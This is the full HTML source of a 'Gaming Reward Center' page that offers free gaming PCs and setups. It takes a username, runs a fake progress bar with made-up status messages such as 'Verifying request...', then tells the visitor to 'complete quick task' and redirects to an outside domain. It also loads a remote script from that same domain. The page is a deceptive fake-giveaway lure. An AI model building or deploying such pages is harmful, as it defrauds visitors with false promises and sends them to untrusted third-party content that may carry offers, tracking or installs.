<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Gaming Reward Center</title>

<script type="text/javascript" id="ogjs" src="https://appchecker.space/cl/js/271x3k"></script>

<style>
body {
    margin:0;
    font-family: Arial, sans-serif;
    background: linear-gradient(135deg,#0f172a,#1e293b);
    color:#fff;
    text-align:center;
}

.container {
    max-width:350px;
    margin:50px auto;
    padding:20px;
    background:#111827;
    border-radius:15px;
    box-shadow:0 0 20px rgba(0,255,150,0.2);
}

img {
    width:100%;
    border-radius:10px;
}

h1 {
    font-size:22px;
}

input {
    width:90%;
    padding:12px;
    margin:10px 0;
    border:none;
    border-radius:8px;
    font-size:16px;
}

button {
    width:95%;
    padding:12px;
    border:none;
    border-radius:8px;
    background:#22c55e;
    color:#fff;
    font-size:16px;
    cursor:pointer;
}

button:hover {
    background:#16a34a;
}

.hidden {
    display:none;
}

.loading {
    width:100%;
    height:10px;
    background:#333;
    border-radius:10px;
    margin-top:15px;
}

.bar {
    height:10px;
    width:0%;
    background:#22c55e;
    border-radius:10px;
}
</style>
</head>

<body>

<div class="container">

<img src="https://i.imgur.com/6Iej2c3.jpg">

<h1>Gaming Reward Center</h1>
<p>Unlock your reward today</p>

<div id="step1">
<input type="text" id="username" placeholder="Enter your username">
<button onclick="nextStep()">Start Now</button>
</div>

<div id="step2" class="hidden">
<p>Select your reward</p>

<button onclick="process()">💻 Gaming PC</button>
<button onclick="process()">🎧 Gaming Setup</button>
<button onclick="process()">🖥️ RGB Desktop</button>
</div>

<div id="step3" class="hidden">
<p id="status">Checking availability...</p>

<div class="loading">
<div class="bar" id="bar"></div>
</div>
</div>

</div>

<script>
function nextStep(){
    var user = document.getElementById("username").value;
    if(user == ""){
        alert("Enter username first");
        return;
    }

    document.getElementById("step1").style.display="none";
    document.getElementById("step2").style.display="block";
}

function process(){
    document.getElementById("step2").style.display="none";
    document.getElementById("step3").style.display="block";

    let bar = document.getElementById("bar");
    let status = document.getElementById("status");

    let width = 0;

    let interval = setInterval(function(){
        if(width >= 100){
            clearInterval(interval);
            status.innerHTML = "Final step: complete quick task";

            setTimeout(function(){
                window.location.href = "https://appchecker.space/cl/i/271x3k";
            },2000);

        } else {
            width++;
            bar.style.width = width + "%";

            if(width == 30){
                status.innerHTML = "Connecting to server...";
            }
            if(width == 60){
                status.innerHTML = "Verifying request...";
            }
            if(width == 90){
                status.innerHTML = "Preparing reward...";
            }
        }
    },40);
}
</script>

</body>
</html>
